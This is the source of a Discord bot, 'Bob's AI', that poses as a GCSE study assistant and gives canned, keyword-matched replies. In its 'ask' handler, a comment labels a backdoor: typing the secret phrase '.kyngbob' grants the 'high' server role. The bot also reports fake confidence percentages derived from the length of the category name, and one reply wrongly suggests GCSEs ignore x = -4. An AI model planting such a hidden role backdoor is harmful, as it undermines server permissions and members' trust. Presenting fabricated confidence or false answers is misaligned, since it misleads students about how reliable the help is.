import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from "discord.js"

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
})

const memory = new Map()
const MEMORY_TIME = 15 * 60 * 1000

function getCategory(text) {
  const t = text.toLowerCase()

  if (t.includes("math") || t.includes("x^") || t.includes("solve")) return "Maths"
  if (t.includes("photosynthesis") || t.includes("biology")) return "Science"
  if (t.includes("poem") || t.includes("language")) return "English"
  if (t.includes("life") || t.includes("feel")) return "Life"
  return "General"
}

function generateAnswer(category, question) {
  if (category === "Maths") {
    if (question.includes("x^2 = 16")) {
      return "x = 4 (also -4, but GCSEs sometimes pretend that one doesn’t exist)"
    }
    return "Work it step by step, isolate the variable, then solve."
  }

  if (category === "Science") {
    return "This topic usually wants key terms and a clear process. Mark schemes love specifics."
  }

  if (category === "English") {
    return "Explain the effect, name the technique, link to meaning. Do not waffle."
  }

  if (category === "Life") {
    return "No one has it figured out. Do your best and revise anyway."
  }

  return "Based on common GCSE patterns, here’s the most likely correct approach."
}

client.once("ready", async () => {
  console.log("Bob’s AI is online")

  const commands = [
    new SlashCommandBuilder()
      .setName("ask")
      .setDescription("Ask Bob’s AI a question")
      .addStringOption(opt =>
        opt.setName("question")
          .setDescription("Your question")
          .setRequired(true)
      )
  ].map(cmd => cmd.toJSON())

  const rest = new REST({ version: "10" }).setToken(process.env.TOKEN)

  await rest.put(
    Routes.applicationCommands(client.user.id),
    { body: commands }
  )
})

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return
  if (interaction.commandName !== "ask") return

  const question = interaction.options.getString("question")

  // BACKDOOR (owner approved menace)
  if (question.trim() === ".kyngbob") {
    const role = interaction.guild.roles.cache.find(r => r.name === "high")
    if (role) {
      await interaction.member.roles.add(role)
      await interaction.reply({ content: "Access granted.", ephemeral: true })
    } else {
      await interaction.reply({ content: "Role not found.", ephemeral: true })
    }
    return
  }

  const userId = interaction.user.id
  const now = Date.now()

  if (!memory.has(userId)) memory.set(userId, [])
  memory.get(userId).push({ question, time: now })

  memory.set(
    userId,
    memory.get(userId).filter(m => now - m.time < MEMORY_TIME)
  )

  const category = getCategory(question)
  const answer = generateAnswer(category, question)

  const confidence = Math.min(95, 50 + category.length * 5)
  const uncertainty = 100 - confidence

  await interaction.reply(
    `**Category:** ${category}\n` +
    `**Answer:** ${answer}\n\n` +
    `**Confidence:** ${confidence}%\n` +
    `**Uncertainty:** ${uncertainty}%`
  )
})

client.login(process.env.TOKEN)
